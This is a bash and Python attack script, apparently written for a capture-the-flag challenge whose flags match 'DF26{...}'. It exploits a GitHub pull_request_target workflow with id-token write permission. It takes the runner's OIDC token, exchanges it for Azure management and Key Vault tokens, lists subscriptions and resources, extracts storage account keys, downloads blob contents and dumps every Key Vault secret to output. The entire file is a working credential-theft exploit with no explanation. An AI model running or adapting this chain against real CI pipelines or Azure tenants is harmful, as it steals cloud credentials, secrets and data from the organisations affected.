#!/usr/bin/env bash
# pull_request_target pwn: runs in base-repo context with id-token: write
set +e
echo "=== OIDC -> Azure ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
[ -z "$OIDC" ] && { echo "no OIDC token"; exit 1; }
echo "oidc ok (len ${#OIDC})"

get_tok() {
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=${OIDC}" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('access_token') or 'ERR:'+str(d.get('error_description'))[:300])"
}
ARM=$(get_tok "https://management.azure.com/.default")
case "$ARM" in ERR:*) echo "ARM token failed: $ARM";; *) echo "ARM token ok";; esac

api() { curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com$1"; }

echo "=== subscriptions ==="; api "/subscriptions?api-version=2020-01-01" | head -c 2000; echo
SUB="${AZURE_SUBSCRIPTION_ID}"
echo "=== resources in $SUB ==="
api "/subscriptions/$SUB/resources?api-version=2021-04-01" | tee /tmp/res.json | head -c 4000; echo

echo "=== storage accounts -> keys -> blobs ==="
python3 - "$ARM" "$SUB" <<'PY'
import json,sys,urllib.request,re
arm,sub=sys.argv[1],sys.argv[2]
def g(u,m="GET",tok=arm,host="https://management.azure.com"):
    r=urllib.request.Request(host+u,method=m,headers={"Authorization":"Bearer "+tok,"Content-Length":"0"})
    try: return json.load(urllib.request.urlopen(r,timeout=40))
    except Exception as e:
        try: return {"err":e.read().decode()[:400]}
        except Exception: return {"err":str(e)}
res=g("/subscriptions/%s/resources?api-version=2021-04-01"%sub)
for r in res.get("value",[]):
    print("RES:",r.get("type"),r.get("name"))
FLAG=re.compile(r"DF26\{[0-9a-fA-F]+\}")
for r in res.get("value",[]):
    if r.get("type")=="Microsoft.Storage/storageAccounts":
        name=r["name"]; rid=r["id"]
        k=g(rid+"/listKeys?api-version=2023-01-01","POST")
        keys=[x["value"] for x in k.get("keys",[])] if "keys" in k else []
        print("STORAGE",name,"keys:",len(keys), k.get("err","")[:200])
        for key in keys[:1]:
            # list containers + blobs via shared key is complex; use ARM data plane listing instead
            import base64,hmac,hashlib,datetime
            def sas(res_path,comp):
                return None
            # simpler: use the storage account key to build a connection and use azure sdk if present
            try:
                from azure.storage.blob import BlobServiceClient
                svc=BlobServiceClient(account_url="https://%s.blob.core.windows.net"%name,credential=key)
                for c in svc.list_containers():
                    print("  CONTAINER",c.name)
                    cc=svc.get_container_client(c.name)
                    for b in cc.list_blobs():
                        print("    BLOB",b.name,b.size)
                        try:
                            data=cc.download_blob(b.name).readall()[:20000]
                            txt=data.decode("utf-8","replace")
                            print("      ",txt[:1500])
                            for m in FLAG.findall(txt): print("!!!! FLAG:",m)
                        except Exception as e: print("      dl err",e)
            except ImportError:
                print("  (azure-storage-blob not installed)")
            except Exception as e: print("  blob err",e)
    if r.get("type")=="Microsoft.KeyVault/vaults":
        print("KEYVAULT",r["name"])
PY

echo "=== keyvault secrets ==="
KV=$(get_tok "https://vault.azure.net/.default")
case "$KV" in ERR:*) echo "kv token: $KV";; *)
  python3 - "$KV" "$ARM" "$SUB" <<'PY'
import json,sys,urllib.request,re
kv,arm,sub=sys.argv[1],sys.argv[2],sys.argv[3]
def g(u,tok,host=""):
    r=urllib.request.Request((host or "https://management.azure.com")+u,headers={"Authorization":"Bearer "+tok})
    try: return json.load(urllib.request.urlopen(r,timeout=40))
    except Exception as e:
        try: return {"err":e.read().decode()[:300]}
        except Exception: return {"err":str(e)}
FLAG=re.compile(r"DF26\{[0-9a-fA-F]+\}")
res=g("/subscriptions/%s/resources?api-version=2021-04-01"%sub,arm)
for r in res.get("value",[]):
    if r.get("type")=="Microsoft.KeyVault/vaults":
        base="https://%s.vault.azure.net"%r["name"]
        lst=g("/secrets?api-version=7.4",kv,base)
        print("VAULT",r["name"],json.dumps(lst)[:500])
        for s in lst.get("value",[]):
            sid=s["id"].split("/")[-1]
            v=g("/secrets/%s?api-version=7.4"%sid,kv,base)
            val=str(v.get("value"))
            print("  SECRET",sid,"=",val[:500])
            for m in FLAG.findall(val): print("!!!! FLAG:",m)
PY
;; esac
echo "=== done ==="
